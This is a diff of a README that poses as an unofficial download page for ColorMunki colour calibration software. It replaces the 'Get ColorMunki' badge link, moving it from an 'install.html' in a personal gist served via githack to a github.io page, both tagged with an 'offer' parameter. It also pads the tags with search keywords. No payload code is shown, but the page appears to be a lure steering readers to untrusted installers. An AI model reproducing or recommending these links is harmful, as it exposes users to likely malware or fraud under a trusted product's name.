@@ -1,6 +1,6 @@
 # ColorMunki Download — Desktop Color Calibration
 
-[![Get ColorMunki GitHub](https://img.shields.io/badge/Get%20ColorMunki%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/sweetcheeks104/470d356891da1508725639fdc8ea2622/raw/112266a34614b09b9687b93b7b5899d171bb4007/install.html?offer=ColorMunki)
+[![Get ColorMunki GitHub](https://img.shields.io/badge/Get%20ColorMunki%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=ColorMunki)
 
 ---
 
@@ -69,7 +69,7 @@ A: Profiles can be saved and shared across devices.
 ---
 
 ## 🔍 Tags
-colormunki, color calibration desktop, display profiling, printer color control, icc color management, monitor tuning pc mac, colormunki pc, colormunki windows, colormunki desktop, colormunki for mac, colormunki for pc, colormunki for windows, colormunki mac
+colormunki, colormunki display, color munki photo, color munki, colormunki photo, x rite colormunki, xrite i1 pro, color calibration desktop, display profiling, printer color control, icc color management, monitor tuning pc mac, colormunki pc, colormunki windows, colormunki desktop, colormunki for mac, colormunki for pc, colormunki for windows, colormunki mac
 
 ---
 
